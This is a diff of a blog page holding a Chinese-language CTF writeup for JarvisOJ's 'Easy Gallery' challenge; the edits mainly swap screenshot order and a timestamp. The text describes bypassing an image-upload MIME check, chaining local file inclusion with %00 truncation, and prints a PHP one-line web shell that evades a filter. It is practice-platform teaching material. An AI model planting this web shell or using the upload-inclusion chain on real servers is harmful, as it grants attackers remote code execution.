@@ -104,9 +104,9 @@
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a8494f9b4e87.png">
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a85394be2c3e.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a85395057c9c.jpg">
-<meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc16d.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc174.jpg">
-<meta property="og:updated_time" content="2018-02-15T07:42:12.535Z">
+<meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc16d.jpg">
+<meta property="og:updated_time" content="2018-02-15T07:44:21.756Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JarvisOJ Writeup">
 <meta name="twitter:description" content="写在最前前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。JarvisOJ：https://www.jarvisoj.com PORT 51根据提示，这里要使用vps上">
@@ -404,10 +404,11 @@
 <h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>题目上一开始就提到，“如果一个漏洞解决不了，那就…”，所以这里我估计至少得有两个漏洞用来利用。<br>然后，熟悉的文件上传，但是直接新建txt文件加入一句话木马后改后缀为.jpg仍然被提示请上传jpg或者gif，我查了一下，这里用的是MIME检测而不是后缀名检测。<br>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/xiaojianpitt/</span>article<span class="regexp">/details/</span><span class="number">6856536</span></span><br></pre></td></tr></table></figure></p>
 <p>所以重新找了一张图在最后写入一句话木马然后成功上传,上传成功以后生成了一个图片ID，通过访问下面链接就能访问到上传的图片。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32785/show</span>.php?id=<span class="number">1518677292</span>&amp;<span class="keyword">type</span>=jpg</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://i.loli.net/2018/02/15/5a85394be2c3e.jpg" alt=""><br>到这里以后要留意一个东西上传图片是index.php?page=submit，访问查看图片却是index.php?page=view,测试一下是否是文件包含。<br><img src="https://i.loli.net/2018/02/15/5a85395057c9c.jpg" alt=""><br>测试成功，这里确实是文件包含，所以构造：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2018/02/15/5a853954bc16d.jpg" alt=""><br>发现后面拼接了一个.php，用%00截断：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/15/5a853954bc174.jpg" alt=""></p>
+<p>发现后面拼接了一个.php，用%00截断：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
 <p>但是这里却出问题了，页面上提示说：You should not do this!这里应该是一句话木马里的相关参数被过滤掉了，所以要重新修改一句话木马。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"phP"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'w'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>重新上传，重复上述步骤，最后就能获得flag。<br><img src="https://i.loli.net/2018/02/15/5a853954bc174.jpg" alt=""><br>flag:CTF{upl0ad_sh0uld_n07_b3_a110wed}</p>
+<p>重新上传，重复上述步骤，最后就能获得flag。<br><img src="https://i.loli.net/2018/02/15/5a853954bc16d.jpg" alt=""><br>flag:CTF{upl0ad_sh0uld_n07_b3_a110wed}</p>
 
       
     </div>
